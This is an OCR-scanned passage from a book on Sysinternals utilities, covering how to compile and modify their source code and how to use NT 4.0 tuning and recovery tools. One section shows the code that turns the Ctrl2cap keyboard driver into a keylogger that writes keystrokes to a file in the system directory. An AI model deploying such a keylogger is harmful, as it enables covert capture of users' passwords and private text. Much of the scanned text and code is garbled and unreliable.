root = RegKeys[i] .Name; 
if ( _tcsnicmp( 
path, root, _tcslen(root) 
) == 0 ) 
break; 
root = RegKeys [i] . FullName ; 
if ( _tcsnicmp( 
path, root, _tcslen(root) 
) == 0 ) 
break; 
HKEY hKey = NULL; 
if ( i < sizeof RegKeys/sizeof 
RegKeys[0] 
) 

Working with the Source Code 9 Chapter 10 
395 
&hKey ) ; 
int len = 
tcslen( root ) ; 
if ( path[len] 
== '\\' ) 
++len; 
::RegOpenKeyEx( 
RegKeys[i] .Key, path+len, 
0, MAXIMUM_ALLOWED, 
if ( fullname 
) 
*fullname 
= RegKeys[i] .FullName; 
Code Listing 10.2 Snippet of Code from enumeration.h in AccessEnum, As 
Modified to Compile in Visual Studio 2005 
int i = 0 ; 
for ( i = 0; i < sizeof RegKeys/sizeof 
RegKeys[0] ; ++i ) 
{ 
root = RegKeys[i] .Name; 
if ( _tcsnicmp( 
path, root, _tcslen(root) 
) == 0 ) 
break; 
root = RegKeys[i] .FullName; 
if ( _tcsnicmp( 
path, root, _tcslen(root) 
) == 0 ) 
break; 
&hKey ) ; 
HKEY hKey = NULL; 
if ( i < sizeof RegKeys/sizeof 
RegKeys[0] 
) 
{ 
int len = 
tcslen( root ) ; 
if ( path[len] 
== 
'\\' 
) 
++len; 
::RegOpenKeyEx( 
RegKeys[i] .Key, path+len, 
0, MAXIMUM_ALLOWED, 
if ( fullname 
) 
* ful iname = RegKeys [ i] . Ful iName ; 
Beyond upgrading the project and source files, modifying the code to work on 
newer versions of the Windows operating system as well as the underlying file 
system are also common tasks. Many of the projects have been developed with NT 
4.0 in mind and most have been updated for use with new versions. Still, you need 
to examine the functions called and reference the relevant Microsoft documentation 

396 
Chapter 10 9 Working with the Source Code 
to make sure the functionality still exists and whether it is supported. This will be of 
special concern when Microsoft finally releases its new file system, WinFX. 
Compiling the Source 
Though most of the applications that come with source code also provide full Visual 
C++ workspace and project files, including resource files, you will find that some 
just come with a C source file, an H header file, and a Makefile. Fundelete includes 
just the C and H files and Tokenmon includes the full resources and help project, for 
example. As mentioned earlier in this chapter, all of these projects were created using 
Visual Studio 6.0, and that is what you should use to compile the tools. In addition 
to Visual Studio 6.0, you should also have the Windows Platform Software 
Development Kit (SDK) and Windows Driver Development Kit (DDK) installed on 
your computer. Both of these kits are available from Microsoft directly. 
Warnings and Errors 
Luckily, the Winternals team has tested all of these applications and they do not have 
any fatal errors that would prevent a successful build. The most common errors you 
may encounter when trying to compile are missing references or identifiers, and you 
can trace all of these back to incorrect environment settings or issues that arose from 
porting.You can easily resolve these "missing reference" errors by adding the 
Platform SDK include path to the referenced directories in the IDE.You can do this 
by selecting Tools ] Options from within the Visual Studio 6.0 IDE, selecting the 
www.syngress.com 

Working with the Source Code 9 Chapter 10 
397 
Directories tab, and adding a new directory. Make sure the Platform SDK 
INCLUDE directory is the first in the list; otherwise, the right header file will not 
be included (see Figure 10.1). 
Figure 10.1 INCLUDE File Directory Settings in Visual Studio 6.0 
Sample Derivative Utilities 
The beauty of having source code is that you can understand what goes on and 
come up with your own utilities that are tailored to your needs, without having to 
do all the research. The Winternals team has done a lot of the legwork and discov- 
ered what works where and why, taking away hours of headaches that system devel- 
opers usually have to endure when developing. 
Have you ever wondered which Win32 application program interface (API) 
function gives you a list of open socket connections, how to install a device driver, 
or how to get low-level disk information? The available source code and online 
write-ups explain all of this in a way that the online MSDN documentation cannot. 
However extensive and well written the help files may be, nothing beats a real-life, 
working application, and that is what you get from the Sysinternals source code. 

398 
Chapter 10 9 Working with the Source Code 
Seeing how a working application calls and uses the Win32 API can help solve 
most of the roadblocks a developer will encounter. Tweaking it to replicate the con- 
ditions required is an easy task, and sometimes you can create a new utility, wholly 
derived from the small sample of source code that came from a Sysinternals tool. 
Simple Keyboard Filters 
In this section, we will attempt to modify the Ctrl2cap device driver to become a 
very simple, but effective, keyboard logger and then a rudimentary 133tspeak driver. 
But before we make any modifications, let's examine the source code as is. We will 
be focusing on the Windows 2000/XP implementation. 
The driver is split into two parts: the installer/uninstaller that performs all the 
necessary steps to register the keyboard driver with the operating system and to 
clean up on uninstall; and the actual keyboard filter. Each component is compiled 
separately and generates an independent binary file. The installer outputs an exe- 
cutable and the driver a .sys file. 
You install the driver as a keyboard filter layered over the system keyboard class 
device. The process is easy; just modify and create the appropriate Registry keys 
under HKLM\System\CurrentControlSet, where the operating system reads device 
and driver information on startup. This is the reason why the system must be 
rebooted after installing or uninstalling this keyboard driver so that the changes take 
effect.The steps required to install the driver are as follows (the uninstall process is 
the reverse of the installation): 
1. Copy the .sys driver file to the System32 directory. 
2. 
Create a new key under HKLM\System\CurrentControlSet\Services and 
set the appropriate data for the key's Registry values. 
www.syngress.com 

Working with the Source Code 9 Chapter 10 
399 
3. Append the name of the new filter to the UpperFilters value of the 
HKLM\System\CurrentControlSet\Control\ { 4D36E96B-E325-11CE- 
BFC 1-08002BE 10318 } key (this is the keyboard class). 
Alternatively, you can create an INF file to install/uninstall the driver and let the 
user go through the standard Windows interface for driver installations, but you 
would have to implement the keyboard filter differently. The source file to this 
installer is ctrl2cap.c, located under the INSTALL directory of the driver's source 
tree. 
Now that you have looked at how the driver is installed, let's look at the actual 
driver. 
The first function called is DriverEntry(). This will initialize the driver and set the 
dispatch entry points where your functions will be called. Of interest is the snippet 
in Code Listing 10.3. 
Code Listing 10.3 Initialization of Dispatch Entry Points 
// 
// Fill in all the dispatch entry points with the passthrough function 
// and explicitly fill in the functions we are going to intercept 
// 
for (i = 0; i < IRP MJ MAXIMUM FUNCTION; i++) { 
DriverObject->MajorFunction[i] 
= Ctrl2capDispatchGeneral; 
// 
// Our read function is where we do our real work. 
// 
DriverObject->MajorFunction[IRP_MJ_READ] 
= Ctrl2capDispatchRead; 

400 
Chapter 10 9 Working with the Source Code 
Code Listing 10.3 is of interest, since typically you would just assign the func- 
tions you want and leave everything else at their default values. This is not so in our 
keyboaM filter as we want to explicitly pass whatever we do not handle to the 
underlying filters. The actual "meat" of the driver is handled by the function 
Ctrl2capDispatchReadO, as you can see in the next line of code in Code Listing 10.3. 
Looking at Ctrl2capDispatchReadO, you see the following line: 
IoSetCompletionRoutine( 
Irp, Ctrl2capReadComplete, 
DeviceObject, 
TRUE, 
TRUE, TRUE ); 
The MSDN documentation provides the following information regarding the 
function" 
IoSetCompletionRoutine registers an IoCompletion routine to be 
called when the next-lower-level driver has completed the 
requested operation for the given IRP. 
In other words, you are telling the operating system that when the lower-level 
keyboard driver has finished processing, it should call the function 
Ctrl2capReadComplete with the appropriate parameters. Now, looking at that func- 
tion, you see the snippet of code in Code Listing 10.4. 
Code Listing 10.4 Snippet of Code from Ctrl2capReadCompleteO 
KeyData = Irp->AssociatedIrp. SystemBuffer; 
numKeys = (int) 
(Irp->IoStatus. Information / 
sizeof (KEYBOARD INPUT DATA) ) ; 
m 
for( i = 0; i < numKeys; 
i++ ) { 
DbgPrint(("ScanCode: 
%x ", KeyData[i] .MakeCode )) ; 
DbgPrint(("%s\n", 
KeyData[i] .Flags ? "Up" : "Down" )) ; 
if ( KeyData [i] .MakeCode == CAPS_LOCK) 
{ 
KeyData [i] .MakeCode = LCONTROL; 
As you can clearly see, you are checking to see whether the scan code you 
received is of the CAPS LOCK key. If so, the code sets it to the left CTRL key (this 
is the intent of the driver in the first place).And, that's it. It is that simple. 
www.syngress.com 

Working with the Source Code 9 Chapter 10 
401 
Keyboard Sniffer 
Now that you understand how the original code works, you are ready to modify this 
piece of code to do something else. Specifically, you will create a trivial keylogger 
that writes to a log file. The first step in the process will be to include the appro- 
priate header files that you will be using. In this case, all you need to include is the 
windows.h header file that contains the definitions (directly or indirectly) to all the 
functions, structures, and constants you will be using. 
Next, you need to define the name and location of the output file to which the 
keylogger will write.You will use a function, called Write2Log O, that will handle all 
file printing for the driver. Therefore, you must also declare the function in the 
ctrl2cap.h file. Finally, in the driver "entry" function, you will initialize and open the 
log file, as seen in Code Listing 10.5. 

402 
Chapter 10 9 Working with the Source Code 
Code Listing 10.5 Initialization of Log file 
GetSystemDirectory(sysdir, 
sizeof(sysdir)) ; 
strcat(sysdir, 
"\\keylog.log") ; 
if ((fout = fopen(sysdir, 
"a")) == NULL) 
{ 
DbgPrint(("Cannot 
write to %s\n", sysdir)) ; 
} 
After you take care of the initialization section, it is time to get to the actual 
keylogging part. Step number one is to modify the Ctrl2capReadCompleteO function 
to write whatever data it receives to a file, instead of simply converting one keycode 
to another. Code Listing 10.6 shows the modified code. 
Code Listing 10.6 Modified Code to Write Keyboard Data to a File 
KeyData = Irp->AssociatedIrp. SystemBuffer; 
numKeys = (int) 
(Irp->IoStatus. Information/ 
sizeof (KEYBOARD INPUT DATA) ) ; 
m 
for( i = 0; i < numKeys; 
i++ ) { 
DbgPrint(("ScanCode: 
%x ", KeyData[i] .MakeCode )) ; 
DbgPrint(("%s\n", 
KeyData[i] .Flags ? "Up" : "Down" )) ; 
Write2Log (KeyData [i] .MakeCode) ; 
You're probably wondering why we're calling a specific log-writing function 
instead of just calling fprintfO. The answer is that what we are receiving a keyboard 
scan code in the buffer, and we must first convert it to something meaningful before 
outputting the data to a file. Code Listing 10.7 shows the code to the Write2LogO 
function. 

Working with the Source Code 9 Chapter 10 
403 
Code Listing 10.7 The Write2LogO Function 
void Write2Log (USHORT code) 
{ 
if (fout != NULL) 
{ 
UINT vkey = MapVirtualKey(code, 3); 
//Convert the scancode to a 
Virtual Key based off our keyboard layout. 
//We're passing MapType = 3, 
since we are on Windows NT, 2K, XP and want to 
//distinguish between right- and 
lefthand keys. 
BYTE state[256] ; 
WCHAR buff[2] ; 
GetKeyboardState(state); 
//Get the keyboard state. 
Sets the values 
of a 256-byte array 
ToUnicode(vkey, code, state, buff, 2, 0); 
//Convert the vkey into 
a Unicode buffer 
fwprintf(fout, "%s", buff); 
//Write buffer to ~le 
} 
} 
In this function, after you have verified that the log file is ready for output, you 
will start converting the keyboard scan code you received to a Unicode buffer you 
can use to write to a file. The first step is to convert the scan code to a virtual key 
using the function Map VirtualKeyO. Notice that you are passing the value 3 as the 
second parameter, since the keylogger is meant to run on Windows systems running 
NT and later, and you want to distinguish between the right- and left-hand side of 
the keyboard. 
The next step is to get a snapshot state of all the keys on the keyboard. The 
number 256 is not a typographical error; we are actually getting back an array repre- 
senting 256 keys~not actual keyboard keys, of which there typically are 101, but 
rather, virtual keys, of which the system has 256. 
Once you have gathered all the necessary information from the system, you can 
perform the conversion to Unicode and finally write to the log file. The first part of 
this is handled by the function ToUnicocleO, which requires the virtual key code, the 
scan code, and the keyboard state in order to make the appropriate conversion to a 
Unicode buffer, that we are storing in the variable buff. Finally, you can write to a 

404 
Chapter 10 9 Working with the Source Code 
file and wait for the next keyboard event. Also note that you are using the wide 
character version of the fprintfO function to handle the Unicode characters. 
133tspeak Filter 
Naturally, this code hardly resembles a James Bond-approved keylogger, but it pro- 
vides the basic framework and understanding required to develop a full-fledged key- 
board driver. Remember that you can use the same functionality to create a 
"133tspeak" keyboard driver.All you would have to do is modify the 
Ctrl2capReadCompleteO function and add a switch block, as in Code Listing 10.8. 
Code Listing 10.8 133tspeak Conve~er Switch Block 
switch (KeyData [ i ] . MakeCode) 
{ 
case 18: 
//e 
case 146: //E 
KeyData[i].MakeCode 
= 4; 
//3 
break; 
case 20: //t 
case 148://T 
KeyData[i].MakeCode 
= 8; //7 
break; 
case 23: //i 
case 151://I 
KeyData[i].MakeCode 
= 2; //i 
break; 
case 24: //o 
case 152://0 
KeyData[i] .MakeCode = II; //0 
break; 

Working with the Source Code 9 Chapter 10 
405 
case 
30: //a 
case 
158://A 
KeyData[i] .MakeCode = 5; //4 
break; 
case 
31: //s 
case 
159://S 
KeyData[i] .MakeCode = 6; //5 
break; 
case 
34: //g 
case 
162://G 
KeyData[i] .MakeCode = 7; //6 
break; 
case 
38: //i 
case 
166://L 
KeyData[i] .MakeCode = 172; //I 
break; 
case 
46: //c 
case 
174://C 
KeyData[i] .MakeCode = 138; //( 
break; 
case 
48: //b 
case 
176://B 
KeyData[i] .MakeCode = 9; //8 
break; 
} 
<pipe> 
<open 
parenthesis> 
As it becomes evident, the code provided by Sysinternals can open a new world 
to a developer starting in the area of low-level programming, or help guide and 
answer questions for a more experienced programmer. 
License Uses 
In this section, you can see the full text of the Sysinternals End User License 
Agreement for use of the utilities and their source code. 
This software is provided "as is" and use of the software is at your 
own risk. Sysinternals disclaims any and all warranties, whether 
express, implied or statutory, including, without limitation, any 
implied warranties of merchantability, fitness for a particular 
www.syngress.com 

406 
Chapter 10 9 Working with the Source Code 
purpose or non-infringement of third-party rights. Sysinternals does 
not warrant that the software is free of defects. 
You are allowed to use software published by Sysinternals at home 
or at work without paying a commercial license fee provided that 
you downloaded the software yourself directly from Sysinternals, 
and" 
* Use the software on computers for which you are the primary 
user; or 
* Use the software on computers for which there is no primary 
user 
(e.g. servers, including Terminal Servers) and you are a full- 
time 
employee of the company that owns the computer; or 
* Use the software on computers within your residence 
A commercial license is required to use the software in any way not 
covered above, including for example: 
* Redistributing the software in any manner, including by com- 
puter 
media, a file server, an email attachment, etc. 
* Embedding the software in or linking it to another program 
* Use of the software for technical support on customer 
computers 
Sales of commercial licenses support Sysinternals product develop- 
ment and assure that this Web site continues to offer valuable, up- 
to-date tools. Established software companies redistribute these 
utilities and incorporate the code into their products because this 
offers the potential to save significant development time. 
Sysinternals commercial licenses are priced according to the com- 
plexity of the licensed code and its role in the target application. If 

Working with the Source Code 9 Chapter 10 
407 
you are interested in licensing Sysinternals tools or source code for 
redistribution or for inclusion with or as part of a software product, 
please contact licensing@sysinternals.com. 
Personal Use 
Beyond their great functionality, power, and ease of use, perhaps the best thing about 
the Sysinternals utilities is that they are free to use! Their use requires no license fee, 
no registration, nothing~provided that you download the tools from the Web site 
and use them in a noncommercial, nonprofit way. The same rule applies to the 
source code to all the tools that bundle the code, along with the binary executable. 
You can tinker with the code, experiment, and discover firsthand what goes on 
"under the hood," without any restrictions. 
Commercial Use 
Though the source code is available for download and developers can examine it, 
you are not allowed to incorporate any of the code into a commercial application, 
even if you provide due credit. To include the code in your commercial applications, 
you should contact Winternals directly and request a commercial license. The same is 
true for the binaries. 

408 
Chapter 10 9 Working with the Source Code 
Summary 
In this chapter, we covered the source code to a number of the Sysinternals tools 
that are available for free download. Though we did not cover all the individual 
source packages that exist on the Web site, we learned how to compile and how to 
modify some of them. We covered issues that arise from porting the applications to 
newer versions of the IDE to the most common errors that you can encounter 
while compiling. 
For a significant portion of this chapter, we examined one of the applications 
and tried to develop a derivative tool using the provided source as our basis. We 
chose to modify Ctrl2cap, though we could have gone through the same process for 
any one of the Sysinternals tools. 
Finally, we covered basic legal issues that arise from the use of source code and 
the limitations we have in using and modifying the code for either personal or com- 
mercial use. However, as with any legal advice, check with an attorney, and in this 
case, an attorney with experience in the software industry. 
Solutions Fast Track 
Overview of the Source 
V--4I A significant number of utilities have their source code available for 
download. 
[---d Most of the source code targets Windows NT, XP, and 2003, but source 
code packages for older operating systems are also available. 
The write-up accompanying the source code is lust as informative. 
gl All of the code is written in C and uses the Microsoft Visual Studio 6.0 
IDE. 
Compiling the Source 
r-el 
Much of the code requires the Windows 
DDK to compile successfully. 
Platform SDK and the Windows 
The Platform SDK is free to download, but the DDK is not. 
Make sure that the Platform SDK include path is the first in the search list. 

Working with the Source Code 9 Chapter 10 
409 
gl When porting to a newer IDE or language, much more so to another 
platform, special consideration must be given to new features and 
restrictions. 
Sample Derivative Utilities 
The source code allows you to create new tools that are based on the 
Sysinternals utilities. 
Attention should be given to the license restrictions. 
V------d You can modify the Ctrl2cap keyboard filter to create a simple keylogger. 
V-d You can modify the Ctrl2cap keyboard filter to create a 133tspeak filter. 
V41 By examining the way in which "benign" system utilities work, you can 
learn how to detect malicious software on your system. 
License Uses 
V41 The Sysinternals software is free and unrestricted for personal use. 
You must obtain a license for any commercial use. 
gl License violators have been caught in the past and it is not worth the 
effort. 


Working with the Source Code 9 Chapter 10 
411 
Q: i don't understand the code! 
A" Luckily, the source code is sufficiently commented to understand what's going 
on. But the real explanation of how the application works and the logic behind 
what goes on is provided in detail on the download page. For more information 
on the individual API functions, refer to the Microsoft MSDN documentation 
for your target platform. 
Q" i created a new utility based off one of the Sysinternals tools. It works great on 
Windows version X, but it crashes on Windows version Z. Why? 
A: It's probably because the API functions don't work the same way in the two ver- 
sions, or they just don't exist. This can be the case when going backward (from 
Windows XP to Windows 2000, for example) . You should refer to the MSDN 
documentation to see which platforms support the API function you are calling. 
Q 
I 
A: 
My newly created application works without a hitch on my computer, but 
nowhere else. Why? 
Does your application require administrative rights? Make sure your user has the 
permissions your application requires. Also, check with the online Sysinternals 
source documentation to determine whether administrative rights are required. 
You can also use Process Explorer to see the individual permissions your applica- 
tion is using. Finally, it's a good idea to avoid requiring administrative privileges, 
if possible. 


414 
Chapter 11 9 NT 4.0-Only Tools 
Introduction 
So far, you have learned about the various tools that are available from the 
Winternals team, and how to use these tools for different purposes. The Winternals 
team developed most of these tools for the most recent additions to the Windows 
product family, such as Windows 2003 Server and Windows XP. However, what 
about administrators who must maintain and support legacy Windows NT 4.0 sys- 
tems? We wrote this chapter with these administrators in mind. The crew at 
Winternals has not abandoned these users and continues to maintain many utilities 
for Windows NT 4.0 (and even for Windows NT 3.51) administration. In the fol- 
lowing sections, administrators of this venerable operating system will discover the 
most popular NT 4.0 tools available to them, and will learn how to use them to 
their fullest potential. The chapter covers topics ranging from advanced system opti- 
mization, to options available in a multiboot system with various versions of 
Windows, to data recovery for NT. 
Optimizing an NT 4.0 System 
(CacheSet, Contig, PMon, Frob) 
Generally, the two best ways to increase the performance of a system is to optimize 
how the file system and memory are used. Achieving optimal use of both of these 
components will ensure the very best levels of application performance. As men- 
tioned earlier, Winternals has not abandoned the owners and caretakers of NT 4.0 
systems. A number of utilities are available, and in the following sections, we will 
describe how to use some of the most popular tools: CacheSet and Contig for file 
system optimization; and PMon and Frob for process monitoring and optimization, 
respectively. 
File System Optimization 
The goal of file system optimization is to make the best use of both short-term 
storage (physical memory) and long-term storage (disk and file system partitions). 
File caching operations employ both types of storage to increase their capability of 
delivering the most-accessed services in the fastest possible way. As a result, such 
operations are complex and require the use of specialized tools by knowledgeable 
administrators, and as good as these tools are, they can severely degrade performance 
if used incorrectly. 
Winternals' CacheSet is an applet that permits administrators to balance physical 
memory utilization with virtual memory stored in pages on a file system at a much 

NT 4.0-Only Tools 9 Chapter 11 
415 
more granular level than the native tools provided with Windows NT 4.0. In addi- 
tion, a file system will perform better if the files that are accessed most often are in 
one contiguous piece of disk real estate, as opposed to being in many pieces scat- 
tered all over a partition. The process of reassembling a file in order to deliver it to a 
client is a memory- and processor-intensive operation, and to complicate matters, 
Windows NT 4.0 is the only member of the Windows product family that does not 
have a native file defragmentation utility. Even DOS, starting at version 6.0, had the 
defrag utility. Winternals' Contig is a single-file defragmenter that you can use to 
analyze and defragment individual files. 
CacheSet 
CacheSet is an applet that allows you to manipulate the working-set parameters of 
the system file cache. In addition to providing you the ability to control minimum 
and maximum working-set sizes, it also allows you to reset the cache's working set, 
forcing it to grow as necessary from a minimal starting point. After it starts, it pre- 
sents the system file cache's current size (updated twice per second) and peak size 
(the largest it has been since the last reboot), and it lets you set new minimum and 
maximum working-set sizes. One advantage CacheSet has over other similar applets 
is that it applies the changes instantaneously when you click the Apply button, so 
you don't have to reboot every time you attempt a new set of values. 
File caching is a complex operation, and much of what goes on is hidden from 
the user's view. In order to understand how to use CacheSet to its potential, we 
should first define two key terms: file cache and working set. According to 
Microsoft, the file cache is a specific, reserved area of virtual storage in the range of 
system memory addresses, and as the term implies, it operates on files, or more 
specifically, on sections of files. When file sections are referenced, the Cache 
www.syngress.com 

416 
Chapter 11 9 NT 4.0-Only Tools 
Manager maps them into this area of virtual memory. This mapping occurs transpar- 
ently to the application that is trying to read or write the file in question. The 
memory used for the file cache is managed just like any other area of real memory 
allocated within the system working set, and is subject to the inherent virtual 
memory management page replacement policy. 
The working set of a given process is the subset of committed bytes that an 
application has accessed recently. Again, according to Microsoft, because the oper- 
ating system can page the memory outside of a process's working set to disk, 
without a performance penalty to the application, the working set, if used correctly, 
is a much better measure of the amount of memory needed. In Windows NT, the 
working-set values are the guidelines for the native Memory Manager that deter- 
mines the number of pages of physical memory assigned to applications. Because 
they are guidelines, conditions can result in the working set increasing to a size that 
is greater than the maximum, or decreasing to less than the minimum. The working 
set in CacheSet affects the page file (see Figure 11.1). 
Figure 11.1 Configuring the File Cache Working Set in CacheSet 
You use CacheSet to set the optimal tuning parameters of the file cache to drive 
the best performance out of your system. Enter new minimum and maximum 
working-set sizes in the available fields and click the Apply button. If you receive an 
error message, you entered a maximum value that is less than the minimum, or a 
minimum value that is less than the minimum system working-set size, or a max- 
imum value that is greater than the maximum system working-set size. For each 
error condition, adjust the values accordingly and attempt to apply them again. 

NT 4.0-Only Tools 9 Chapter 11 
417 
The consensus on optimal working-set sizes is that there is no consensus. All of 
the conventional guidance suggests that the best values for a particular application or 
server are specific to the server, as this depends entirely on the server's role and on 
typical resource utilization. Settling on the best values for servers under your respon- 
sibility will come through trial and error and your keen powers of observation. For 
example, the default setting in Windows NT 4.0 Workstation is to minimize the use 
of the disk cache. As a starting point, you may want to balance the use of physical 
memory and the disk cache and observe the performance of commonly used appli- 
cations so that you can adjust the settings accordingly. 
Once you change the working-set values, the cache's size changes immediately 
and then proceeds to shrink or grow quickly as the working set is trimmed at one- 
second intervals. The cache pages that are released are still in memory, but they can 
be relinquished quickly for use by other programs that need more memory. 
Similarly, the cache can easily regain pages as applications access file system data.You 
use the Reset button to revert to the original working-set values when the 
CacheSet session was started. 
You may assume that the Clear button clears the values you just set so that you 
can try another setting; however, your intuition would be steering you incorrectly. 
The Clear button will force the cache to release all of its pages in memory. Once the 
pages are cleared, the cache will grow again as necessary using the current working- 
set values. Please note that using the Clear button will not flush the cache. The cache 
can reclaim these pages if they become available, but for the moment, they will 
become available to other applications. 

418 
Chapter 11 9 NT 4.0-Only Tools 
Contig 
Unlike every other Windows product, Windows NT 4.0 has no native file system 
deffagmentation application, although it did include deffagmentation APIs, with 
third-party vendors were able to exploit. As a result, a number of NT 4.0 disk 
defragmentation utilities became available, including Winternals' very robust Deffag 
Manager. All of these offerings were commercial products; none was available under 
a freeware license. If you find yourself in the difficult position of trying to justify the 
purchase of new administration software for legacy NT 4.0 systems, Winternals' 
Contig may deliver an effective stopgap solution. 
Contig is targeted at the optimization of individual files, and it has two func- 
tions: it reassembles file fragments that are scattered around a disk partition into a 
single contiguous file or at least a minimal the number of fragments, and you can use 
it to create new files that are contiguous. It is ideal for quickly optimizing critical 
files that are continuously fragmenting. For individual files that quickly become 
defragmented, such as large documents or images that are shared on a busy file 
server, if you are using a commercial deffagmentation utility, you must run the 
deffagmentation process every time on the entire file system when performance 
degrades or files become unreadable due to deffagmentation.You can run Contig 
quickly on a scheduled or ad hoc basis because it works on a single file. 
Furthermore, because Contig uses the deffagmentation APIs referenced earlier, it will 
not cause disk corruption, even if it terminates in the middle of defragmenting a file. 

NT 4.0-Only Tools 9 Chapter 11 
419 
You run Contig from the Windows NT CLI (select Start i Run I cmd). 
Typing eontig without switches or settings produces the output seen in Figure 11.2, 
which displays a description of Contig and the available switches. 
Figure 11.2 Getting Contig Help at the Command Line 
As seen in Figure 11.2, you use the following command-line syntax to run 
Contig: 
contig [-v] [-a] [-q] [-s] [filename] 
Verbose operation, using the -v switch, will display the detailed steps being exe- 
cuted as the defragmentation operation is being executed. The alternative is Quiet 
mode, using the -q switch, which also overrides the -v switch when they are acci- 
dentally used together. In Quiet mode, only summary information displays. Before 
committing to defragmenting a file, you can check whether defragmenting a file is 
beneficial, or even possible, by using the -a switch to analyze the file. Figure 11.3 
displays verbose output when analyzing the file zcentral.exe.You can use the -s 
switch to process files in a specified directory and all subdirectories. To accomplish 
this, you would use Contig with wildcards and not the complete filename. For 
instance, to &fragment all text files under C:\Winternals in the directory structure 
displayed in Figure 11.3, you would enter contig -s c:\winternals\*.txt at the 
CLI. 

420 
Chapter 11 9 NT 4.0-Only Tools 
Figure 11.3 Analyzing a File in Verbose Mode with Contig 
Process Optimization 
Once you have your file systems whipped into shape and you have eliminated bot- 
tlenecks associated with paging, file caching, and fragmented files, you can turn your 
attention to processes running on the server. Sysinternals' PMon takes over where 
the Task Manager leaves off. The Windows Task Manager can provide a significant 
amount of information about the processes running on your server, but PMon goes 
much deeper, providing blow-by-blow coverage of what is actually happening with 
each process. Armed with this information, you can begin to shut down unnecessary 
processes, and once only the required processes are running, you can use Frob to bal- 
ance how many system resources are allocated to foreground and background pro- 
cesses. Let's begin with PMon. 

NT 4.0-Only Tools 9 Chapter 11 
421 
PMon 
Every Windows NT administrator has used and continues to use the Windows Task 
Manager to monitor resource utilization and get to the bottom of performance 
issues. It provides useful information about how much memory and processing 
horsepower individual processes are using; however, sometimes it would be useful to 
know when threads and processes are created and deleted. This is where PMon is a 
great fit. It is a graphical user interface (GUI)-based frontend to a device driver that, 
in Sysinternals' description, uses several undocumented hooking functions that cause 
the driver to be engaged whenever a process or thread is created or deleted. Once 
engaged, it logs and displays the process or thread information in the GUI. In many 
ways, it is a rough equivalent to ps and top, found on UNIX and Linux systems. 
Additional functionality is available if you run PMon on the checked build of NT or 
on the Symmetric Multiprocessor (SMP) kernel, in that PMon can optionally display 
all context switch activity. 
PMon consists of two essential components: ntpmon.exe and procsys.sys.You can 
tell what they do by their filename extensions: ntpmon is the executable and procsys 
is the driver. To run PMon launch it from the Run dialog box (Start ] Run) by 
browsing to the directory where you extracted the PMon files and entering 
ntpmon in the Open: field, or launch it from the Windows CLI (Start ] Run ] 
cmd). The PMon GUI launches the device driver, procsys.sys, which must be in the 
same directory as ntpmon.exe for the program to execute successfully. 
As displayed in Figure 11.4, each line in the listview displays the name of the 
Source process that owns a thread involved in thread creation or deletion, or a con- 
text swap, as indicated under the Action column heading. The thread identification 
(TID) number immediately follows the process name under the Arguments heading. 
In cases where the owner process has terminated and the thread is still displayed, 
PMon will display "???" for the name. The Elapsed column indicates the time in sec- 
onds between successive events in the display. On many occasions, the value will be 
0. This occurs when the events happened within the span of a single tick (10 mil- 
liseconds) of the system timer clock. 

422 
Chapter 11 9 NT 4.0-Only Tools 
Figure 11.4 Monitoring Thread Creation and Deletion with PMon 
Under each menu heading are items for exporting the display output to an 
ASCII file, controlling display preferences, and getting information about PMon. 
Under the File menu, the Save and Save As items are used to generate static text files 
from the contents of the PMon listview. Save adds new data to an existing file and 
Save As creates a new file or overwrites an existing file. Under the Events menu, 
Capture Events and Auto Scroll are checked by default. Capture Events toggles the 
active monitoring of thread and process creation and deletion. Auto Scroll, when 
enabled, permits the continuous display of data without overwriting the listview in 
the open window. The last item under the Events menu, Clear Display, resets the 
listview in the open window. Only version information is available under the mis- 
leadingly named Help menu. 

NT 4.0-Only Tools 9 Chapter 11 
423 
files are in C:\WlNNT~system32. You can install a minimal checked build 
environment by simply replacing the NTOSKRNL.EXE and HAL.DLL files 
from your current installation of Windows NT 4.0 with the versions 
included on the checked build CD. 
Frob 
We are now at the point where we can start to fine-tune the performance of fore- 
ground and background applications. Traditionally, no native tools were available in 
Windows NT 4.0 to accomplish this, but once again, Sysinternals has come up with a 
solution. Foreground and background process-performance settings are measured in 
quanta. A quantum is the length of time a thread will run without being pulled off 
the CPU so that another thread can be run. On Windows NT Server 4.0, the quanta 
are fixed for both foreground and background processes at 120 ms. On NT worksta- 
tions, a background process has a quantum of 20 ms and a foreground process has a 
quantum of either 20, 40, or 60 ms.You set this using the slider control on the 
Performance tab of the System applet in the Control Panel, as shown in Figure 11.5. 
www.syngress.com 

424 
Chapter 11 9 NT 4.0-Only Tools 
Figure 11.5 Setting Application Performance in the Windows NT System 
Applet 
Frob, soon to become a verb in your vocabulary, permits you to set quanta values 
to suit your tastes (in the words of Sysinternals, you can "frob" the quanta to your 
liking; see Figure 11.6). Every time you enter a new setting, the new quanta will 
apply immediately to every process currently running in Windows NT, and will 
apply to new processes as they are created. 
Figure 11.6 Fine-Tuning Application Performance with Frob 
To run Frob launch it from the Run dialog box (Start I Run) by browsing to 
the directory where you extracted the Frob executable and entering ntfrob in the 
Open" field. When the Frob GUI displays, the fields will be populated with the 
system's current foreground and background quanta. Simply enter different values 
and click the Apply button If the new settings do not deliver the desired perfor- 
mance characteristics, you can click the Reset button to restore the quanta to the 

NT 4.0-Only Tools 9 Chapter 11 
425 
original values displayed when Frob was launched. Note that a value of 0 and values 
greater than 420 ms are effectively equal to a quantum of 10 ms, and that Frob does 
not check against these ranges. 
Again, much like CacheSet, there is no consensus concerning optimal values for 
foreground and background quanta. The best values for a given server will depend 
on its role and resource utilization, which may very well differ from other servers. 
Fortunately, Frob makes it easy to test, reset, and apply the optimal settings for a par- 
ticular server. 
Recovering Data (NTRecover) 
Having been through a description of ERD Commander in Chapter 1 and Remote 
Recover in Chapter 6, you may find yourself jealous and wondering whether any- 
thing similar is available for Windows NT 4.0. The good news is that something 
similar is available. Winternals continues to support NTRecover, a predecessor of 
Remote Recover. According to the Sysinternals Web site, "NTRecover is an 
advanced Windows NT dead-system recovery utility for x86 NT installations. Using 
NTRecover, NT machines that fail to boot because of data corruption, improperly 
installed software or hardware, or faulty configuration, can be accessed and recovered 
using standard administrative tools, as if the machine were up and running." The 
biggest difference between Remote Recover and NTRecover is that the 
NTRecover client does not connect to the dead host across the network, but uses an 
RS-232 serial connection. 

426 
Chapter 11 9 NT 4.0-Only Tools 
NTRecover consists of host and client software, with the two computers con- 
nected with a null-modem serial cable. The host software runs on a functioning 
Windows NT 3.51 or 4.0 system; the NTRecover client software is booted from a 
floppy disk and runs on the nonfunctioning system. The NTRecover host software 
creates virtual disk drives on the host machine that represent the drives present on 
